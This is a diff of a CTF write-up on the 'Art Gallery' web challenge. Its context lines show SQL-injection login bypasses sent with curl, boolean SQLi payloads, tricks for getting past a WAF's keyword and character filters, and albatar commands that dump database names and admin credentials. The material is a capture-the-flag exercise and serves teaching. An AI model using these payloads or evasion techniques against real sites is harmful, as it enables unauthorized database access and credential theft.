@@ -10,9 +10,7 @@ tags: [ctf, Shakti CTF, web]
  * Type: Web
  * Points: 300 pts
  * Description: 
- > I'm on the way to open my very own Art Gallery. I can allow you to take a peak if you want. But not everyone though
- > Site: http://34.66.139.33/
- > Author: Nimisha
+ > I'm on the way to open my very own Art Gallery http://34.66.139.33/. I can allow you to take a peak if you want. But not everyone though. Author: Nimisha
 
 Exploiting a boolean SQLi without `WHERE` and the `[ &=]` characters using REGEXP and the [albatar](https://github.com/lanjelot/albatar) framework.
 
@@ -85,7 +83,7 @@ $ curl --data-raw "username=a'%2b'b&password=a'%2b'b" http://34.66.139.33/auth.p
 welcome!!
 ```
 
-Or by finding that `test` is a valid username and comment the rest of the query:
+Or by finding that `test` is a valid username and commenting the rest of the query:
 ```console
 $ curl --data-raw "username=test'#&password=whatev" http://34.66.139.33/auth.php
 welcome!!
@@ -127,7 +125,7 @@ Once logged-in as `test'#` there is a link to a `/cart.php` page:
 </body>
 </html>
 ```
-But there is nothing else there so let's go back to the SQLi.
+But now we feel stuck so let's go back to the SQLi.
 
 Turns out we actually have a boolean SQLi:
 * `username=test'%2b(select*from(select('a'))a)#&password=` -> "welcome!!"
@@ -177,10 +175,10 @@ for r in sqli.exploit():
     print(r)
 ```
 
-Because the WAF blocks the `WHERE` keyword and some characters `[ &=]`, we need to:
+Because the WAF blocks the `WHERE` keyword and some special chars like `[ &=]`, we need to:
 * replace all spaces with `/**/`
-* remove the `=` and `&` chars from our regexp search pattern
-* use the `IN` keyword instead of `=` if we ever need to
+* either remove the `=` and `&` chars from our regexp search [pattern](https://github.com/lanjelot/albatar/blob/master/albatar.py#L511) or use [hex-encoding](https://github.com/lanjelot/albatar/blob/master/albatar.py#L522)
+* use the `IN` keyword instead of `=` (although we won't need to)
 * juggle with `count()` and `limit` instead of using `where`
 
 Demo:
@@ -219,7 +217,9 @@ $ python shakti.py -q "select concat_ws(0x3a,username,password) from cart.accoun
 admin:shaktictf{7h3_w4r_0f_sql1_h4s_b3gun}
 ```
 
-Flag was `shaktictf{7h3_w4r_0f_sql1_h4s_b3gun}`. And just FYI:
+Flag was `shaktictf{7h3_w4r_0f_sql1_h4s_b3gun}`.
+
+Just FYI:
 ```
 $ python shakti.py -b --current-db --current-user --hostname --dbs --user
 03:25:41 albatar - Starting Albatar v0.1 (https://github.com/lanjelot/albatar) at 2021-04-05 03:25 AEST
@@ -240,5 +240,7 @@ information_schema
 cart
 03:28:11 albatar - Time: 0h 2m 30s
 ```
+
+Thanks for the CTF! :)
 
 [@lanjelot](https://twitter.com/lanjelot)
